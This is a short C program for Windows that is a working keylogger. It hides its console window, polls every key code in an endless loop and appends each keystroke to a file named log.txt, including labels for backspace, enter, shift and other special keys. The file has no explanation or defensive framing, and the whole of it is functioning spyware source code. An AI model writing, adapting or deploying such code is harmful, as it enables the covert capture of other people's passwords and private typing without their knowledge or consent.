#include <windows.h>
#include <stdio.h>

void StartLogging();

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    StartLogging();
    return 0;
}

void StartLogging(){
    char c;
    while (1) {
        for(c=1;c<=254;c++){
            if(GetAsyncKeyState(c) &  0x1 ) {
                FILE *log;
                log = fopen("log.txt", "a");
                switch (c) {
                    case VK_BACK:
                        fprintf(log, "[backspace]");
                        break;
                    case VK_RETURN:
                        fprintf(log, "[enter]");
                        break;
                    case VK_SHIFT:
                        fprintf(log, "[shift]");
                        break;
                    case VK_CONTROL:
                        fprintf(log, "[control]");
                        break;
                    case VK_CAPITAL:
                        fprintf(log, "[cap]");
                        break;
                    case VK_TAB:
                        fprintf(log, "[tab]");
                        break;
                    case VK_MENU:
                        fprintf(log, "[alt]");
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        fprintf(log, "%c", c);
                }
                fclose(log);
            }
        }
    }
}